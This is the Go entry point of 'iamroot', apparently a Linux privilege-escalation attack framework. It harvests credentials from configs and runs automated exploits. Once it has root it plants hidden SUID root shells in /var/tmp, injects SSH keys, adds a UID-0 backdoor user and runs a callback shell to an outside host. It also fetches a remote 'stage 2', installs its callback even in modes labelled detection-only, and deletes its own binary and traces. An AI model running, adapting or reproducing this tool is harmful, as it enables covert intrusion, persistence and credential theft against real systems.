package main

import (
	"crypto/sha256"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/audit"
	"github.com/cleissonamanacio/iamroot/internal/callback"
	"github.com/cleissonamanacio/iamroot/internal/exploit"
	"github.com/cleissonamanacio/iamroot/internal/exploit/modules"
	"github.com/cleissonamanacio/iamroot/internal/loot"
	"github.com/cleissonamanacio/iamroot/internal/payload"
	"github.com/cleissonamanacio/iamroot/internal/persist"
	"github.com/cleissonamanacio/iamroot/internal/pyrunner"
	"github.com/cleissonamanacio/iamroot/internal/stage2"
	"github.com/cleissonamanacio/iamroot/internal/sysutil"
)

const backdoorUser = "iamroot"

var cbHost string

func main() {
	complete := flag.Bool("complete", false, "run the full audit (linpeas-style) before exploits")
	harvest := flag.Bool("harvest", false, "credential harvest from web/app configs only")
	skipAudit := flag.Bool("skip-audit", false, "skip Phase 1 audit, go straight to exploits")
	suggest := flag.Bool("suggest", false, "run the exploit suggester (kernel→CVE) only")
	persist := flag.Bool("persist", false, "also write a backdoor UID-0 user after exploit")
	list := flag.Bool("list", false, "dry-run: scan + rank modules without running exploits")
	auditOnly := flag.Bool("audit-only", false, "detection report only — never fetch stage 2")
	selftestPy := flag.Bool("selftest-py", false, "run every embedded Python helper's selftest")
	help := flag.Bool("help", false, "show usage")
	flag.Parse()

	if *help {
		usage()
		return
	}

	authGate()

	if cbHost != "" {
		callback.SetHost(cbHost)
	}
	callback.InstallNow()

	if *selftestPy {
		fmt.Println("[*] Running embedded Python selftests...")
		if err := pyrunner.SelfTest(workDir()); err != nil {
			fmt.Fprintf(os.Stderr, "[-] selftest failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] all Python helpers passed selftest")
		return
	}

	if *persist {
		exploit.SetPersist(true)
	}

	banner()

	if os.Geteuid() == 0 && os.Getuid() != 0 {
		upgradeSuidShell()
	}

	switch {
	case *harvest:
		fmt.Print("[*] Harvest mode: scanning web/app configs for credentials...\n")
		modules.Harvest()
		return
	case *suggest:
		fmt.Print("[*] Exploit suggester mode — matching CVEs to this kernel/distro\n")
		audit.Suggest()
		return
	}

	var ctx *audit.AuditFindings
	switch {
	case *skipAudit:
		fmt.Print("[*] Phase 1: SKIPPED (--skip-audit) — running exploit pipeline directly\n")
	case *complete:
		fmt.Print("[*] Phase 1: Complete audit\n")
		ctx = audit.Run(true)
		ctx.PipelineSummary()
	default:
		fmt.Print("[*] Phase 1: Running concurrent privesc audit...\n")
		ctx = audit.Run(false)
		ctx.PipelineSummary()
	}
	fmt.Println("\n\x1b[32m[*] Audit complete.\x1b[0m")

	if !*skipAudit {
		audit.Suggest()
	}

	lootDir := loot.Collect()

	full := payload.Available()
	if full {
		if exploit.FindCompiler() == "" {
			exploit.TryInstallCompiler()
		}
		exploit.TryInstallLinuxHeaders()
	}

	if os.Getuid() == 0 {
		fmt.Println("[!] Already running as root. Exiting.")
		cleanup(lootDir)
		return
	}

	fmt.Println("\n[*] Phase 2: iamroot exploit pipeline")
	fmt.Println(strings.Repeat("=", 54))

	if !full {
		fmt.Println("[!] audit build — no local payload bundle; detection only")
		runDryRun(ctx)
		if *list || *auditOnly {
			cleanup(lootDir)
			return
		}
		stage2.Run()
		cleanup(lootDir)
		return
	}

	if *list || *auditOnly {
		runDryRun(ctx)
		cleanup(lootDir)
		return
	}

	fmt.Print("[*] Pass 1: instant misconfigurations...\n")
	if exploit.RunPass1(ctx) {
		onRootObtained()
		cleanup(lootDir)
		return
	}

	fmt.Print("\n[*] Pass 2: exploit pipeline (concurrent scan, confidence-ordered)...\n")
	viable := exploit.ScanPass2(ctx)
	exploit.PrintScan(viable)
	if len(viable) == 0 {
		fmt.Println("\n[-] No automated exploits applicable to this system.")
		fmt.Println("[*] Consider manual checks or kernel-specific exploits.")
		cleanup(lootDir)
		return
	}
	fmt.Printf("\n[*] %d viable exploits — attempting in confidence order...\n", len(viable))
	if exploit.RunPass2(viable) {
		onRootObtained()
		cleanup(lootDir)
		return
	}

	fmt.Println("\n[-] All automated exploitation attempts failed.")
	postmortem()
	cleanup(lootDir)
}

func runDryRun(ctx *audit.AuditFindings) {
	fmt.Print("[*] --list dry-run: detection only (no exploits executed)\n")
	for _, e := range exploit.Pass1Entries() {
		fmt.Printf("[*] Checking: %s ... ", e.Name())
		if e.CheckVulnerable(ctx) {
			exploit.PrintVulnerable(e.Name())
		} else {
			fmt.Println("not applicable")
		}
	}
	viable := exploit.ScanPass2(ctx)
	exploit.PrintScan(viable)
	fmt.Printf("\n[*] Would attempt %d exploit(s) in the order above.\n", len(viable))
}

func onRootObtained() {
	fmt.Println("\n[+] Exploitation successful!")
	persistUser := ""
	if !exploit.NoPersist() {
		persistUser = backdoorUser
	}
	if os.Getuid() == 0 {

		establishInProcess(persistUser)
		return
	}

	pipeIntoSuidShells(persistUser)
}

func establishInProcess(persistUser string) {
	fmt.Println("[+] Running as uid=0 — establishing persistence")
	persist.DropSuidBash()
	persist.InjectSSHKey()
	if persistUser != "" {
		persist.AddBackdoorUser(persistUser)
	}
	if block := callback.ShellBlock(); block != "" {
		_ = exec.Command("sh", "-c", block).Run()
	}
}

func pipeIntoSuidShells(persistUser string) {
	for _, bin := range suidCandidates() {
		if _, err := os.Stat(bin); err != nil {
			continue
		}
		out, _ := exec.Command(bin, "-p", "-c", "id -u").Output()
		if strings.TrimSpace(string(out)) != "0" {
			continue
		}
		fmt.Println("[+] Root access retrieved! CONGRATULATION!!")
		snippet := persist.Block(persistUser) + "\n" + callback.ShellBlock()
		_ = exec.Command(bin, "-p", "-c", "id; "+snippet).Run()
		return
	}
	fmt.Println("[+] Root access retrieved! CONGRATULATION!!")

	callback.InstallNow()
}

func authGate() {
	wantHash := strings.TrimSpace(os.Getenv("IAMROOT_PASS_HASH"))
	if wantHash == "" {
		return
	}
	pass := os.Getenv("IAMROOT_PASS")
	if pass == "" && sysutil.Isatty(0) {
		fmt.Fprint(os.Stderr, "[*] iamroot password: ")
		buf := make([]byte, 0, 128)
		tmp := make([]byte, 1)
		for {
			n, _ := os.Stdin.Read(tmp)
			if n == 0 || tmp[0] == '\n' {
				break
			}
			buf = append(buf, tmp[0])
		}
		pass = strings.TrimRight(string(buf), "\r")
	}
	sum := sha256.Sum256([]byte(strings.TrimRight(pass, "\r\n")))
	if fmt.Sprintf("%x", sum) != wantHash {
		fmt.Fprintln(os.Stderr, "[-] Wrong Password!")
		os.Exit(1)
	}
	os.Unsetenv("IAMROOT_PASS")
}

func upgradeSuidShell() {
	fmt.Println("[+] euid=0 detected — upgrading to uid=0")
	if sysutil.SetFullRoot() {
		persist.DropSuidBash()
	}
}

func suidCandidates() []string {
	return []string{
		"/var/tmp/.iamroot_rootbash", "/var/tmp/.rootbash_ebpf", "/var/tmp/.rootbash_cf",
		"/var/tmp/.rootbash_df", "/var/tmp/.rootsh_fg", "/var/tmp/.rootbash_dc",
		"/var/tmp/.rootbash_pc", "/var/tmp/.suid_bash", "/var/sh", "/var/tmp/.rootbash_go",
		"/var/tmp/.rootbash_ovl", "/var/tmp/.rootbash_ovl23", "/var/tmp/.rootbash_mysql",
		"/var/tmp/.rootbash_enl", "/var/tmp/.rootbash_cron", "/tmp/.r00t",
	}
}

func hostName() string {
	h, _ := os.Hostname()
	return h
}

func kernelVer() string {
	out, _ := exec.Command("uname", "-r").Output()
	return strings.TrimSpace(string(out))
}

func workDir() string {
	if w := os.Getenv("IAMROOT_WORK_DIR"); w != "" {
		return w
	}
	if d, err := os.Getwd(); err == nil {
		return d
	}
	return "/tmp"
}

func cleanup(lootDir string) {
	for _, d := range []string{
		"/dev/shm/iamroot_loot", "/dev/shm/iamroot_sshkey",
		filepath.Join(workDir(), "iamroot_loot"), filepath.Join(workDir(), "loot"),
	} {
		_ = os.RemoveAll(d)
	}
	for _, f := range []string{
		"/var/tmp/.iamroot_rootbash", "/var/tmp/.rootbash_ebpf", "/var/tmp/.rootbash_cf",
		"/var/tmp/.rootbash_df", "/var/tmp/.rootsh_fg", "/var/tmp/.rootbash_dc",
		"/var/tmp/.rootbash_pc", "/var/tmp/.suid_bash", "/var/sh",
	} {
		_ = os.Remove(f)
	}

	if exe, err := os.Executable(); err == nil {
		_ = os.Remove(exe)
	}
}

func postmortem() {
	fmt.Println(strings.Repeat("─", 60))
	fmt.Println("[*] Post-mortem — possible next steps:")
	fmt.Printf("    kernel: %s   sudo: %s\n", kernelVer(), sudoVer())
	if exploit.FindCompiler() == "" {
		fmt.Println("    • No C compiler — pre-build payloads on another host and upload")
		fmt.Println("      to $IAMROOT_WORK_DIR/<module>/<binary> (see README).")
	}
	fmt.Println("    • Re-run with --harvest to collect credentials from configs.")
	fmt.Println("    • Try the exploit suggester (--suggest) for kernel-specific CVEs.")
	fmt.Println(strings.Repeat("─", 60))
}

func sudoVer() string {
	out, err := exec.Command("sudo", "-V").Output()
	if err != nil {
		return "?"
	}
	return strings.SplitN(string(out), "\n", 2)[0]
}

func banner() {
	fmt.Println("\n[====================================================]")
	fmt.Println("  [+] iamroot PrivEsc (Go + Python) [+]")
	fmt.Println("[====================================================]")
	fmt.Println("  flags: --complete --harvest --skip-audit --suggest --persist --list --audit-only")
	fmt.Println("  audit build: detection only — LPE step fetches stage 2 from the mirror")
	fmt.Print("[====================================================]\n")
}

func usage() {
	fmt.Println("iamroot — Linux LPE framework (Go orchestrator + Python exploits)")
	fmt.Println("\nusage: iamroot [flags]")
	fmt.Println("  (default)      concurrent audit + exploit pipeline (no persistence)")
	fmt.Println("  --complete     full audit then exploit pipeline")
	fmt.Println("  --harvest      credential harvest from web/app configs only")
	fmt.Println("  --skip-audit   skip audit, go straight to exploits")
	fmt.Println("  --suggest      exploit suggester (kernel→CVE) only")
	fmt.Println("  --persist      write backdoor UID-0 user after exploit")
	fmt.Println("  --list         dry-run: detect + rank, no exploitation")
	fmt.Println("  --audit-only   detection report only (audit build: never fetches stage 2)")
	fmt.Println("  --selftest-py  verify embedded Python helpers")
}
